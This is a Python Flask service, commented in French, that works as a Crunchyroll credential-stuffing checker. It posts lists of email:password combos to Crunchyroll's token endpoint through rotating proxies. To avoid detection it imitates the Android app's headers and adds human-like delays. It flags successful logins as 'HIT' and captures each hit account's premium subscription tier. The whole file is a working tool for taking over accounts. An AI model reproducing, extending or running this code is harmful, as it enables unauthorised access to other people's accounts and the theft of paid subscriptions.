import os
import time
import requests
import random
import uuid
from flask import Flask, request, jsonify
from flask_cors import CORS
from concurrent.futures import ThreadPoolExecutor

app = Flask(__name__)
CORS(app)

# Liste de proxies (Résidentiels ou HTTP stables)
PROXIES = []

class CrunchyrollChecker:
    def __init__(self, combo, proxy=None):
        self.email, self.password = combo.split(':')
        self.proxy = proxy
        self.session = requests.Session()
        self.status = "EN ATTENTE"
        self.membership = "Gratuit"
        self.device_id = str(uuid.uuid4())
        
    def get_headers(self):
        # On imite les headers de l'application mobile pour plus de stabilité
        return {
            'User-Agent': 'Crunchyroll/3.46.1 Android/13',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Accept-Encoding': 'gzip',
            'Connection': 'Keep-Alive',
            'Authorization': 'Basic b2VkYXJteHNtZndrY2t2eWtranM6Z1VnS0pSclNWYm9LbkZ3YnZtY3pIelZESXp3S3pSdzE=' # Token API public standard
        }

    def check(self):
        proxy_config = {"http": f"http://{self.proxy}", "https": f"http://{self.proxy}"} if self.proxy else None
        
        try:
            # Phase 1: Récupération du Token d'accès (Grant Type Password)
            data = {
                'grant_type': 'password',
                'username': self.email,
                'password': self.password,
                'scope': 'offline_access',
                'device_id': self.device_id,
                'device_name': 'SM-G998B',
                'device_type': 'samsung'
            }
            
            # Simulation d'un petit délai humain
            time.sleep(random.uniform(1, 2.5))
            
            response = self.session.post(
                "https://www.crunchyroll.com/auth/v1/token", 
                data=data, 
                headers=self.get_headers(), 
                proxies=proxy_config, 
                timeout=10
            )
            
            json_res = response.json()
            
            if "access_token" in json_res:
                self.status = "HIT"
                token = json_res["access_token"]
                self.capture_membership(token, proxy_config)
            elif "invalid_credentials" in response.text:
                self.status = "MAUVAIS_PASS"
            elif "too_many_requests" in response.text:
                self.status = "LIMITE_RATE"
            else:
                self.status = "BLOQUÉ"

        except Exception as e:
            self.status = "ERREUR"
            
        return {
            "combo": f"{self.email}:{self.password}", 
            "status": self.status, 
            "membership": self.membership, 
            "proxy": self.proxy if self.proxy else "Direct"
        }

    def capture_membership(self, token, proxy_config):
        """Vérifie si le compte possède un abonnement Premium"""
        try:
            headers = {
                'Authorization': f'Bearer {token}',
                'User-Agent': 'Crunchyroll/3.46.1 Android/13'
            }
            # Appel à l'API de souscription
            res = self.session.get(
                "https://www.crunchyroll.com/subs/v1/subscriptions", 
                headers=headers, 
                proxies=proxy_config, 
                timeout=10
            )
            data = res.json()
            
            # Si la liste des abonnements n'est pas vide
            if data.get("total", 0) > 0:
                # On récupère le nom du plan (Fan, Mega Fan, etc.)
                self.membership = data["items"][0].get("subscription_type", "Premium")
            else:
                self.membership = "Gratuit"
        except:
            self.membership = "Vérification Échouée"

@app.route('/check-crunchy', methods=['POST'])
def run_check():
    data = request.json
    combos = data.get('combos', [])
    results = []
    
    # Crunchyroll est sensible, on utilise peu de workers simultanés
    with ThreadPoolExecutor(max_workers=4) as executor:
        for combo in combos:
            proxy = random.choice(PROXIES) if PROXIES else None
            checker = CrunchyrollChecker(combo, proxy)
            results.append(executor.submit(checker.check).result())
            
    return jsonify({"results": results})

@app.route('/status')
def status():
    return jsonify({"status": "ready", "engine": "Crunchyroll-Mobile-API"})

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
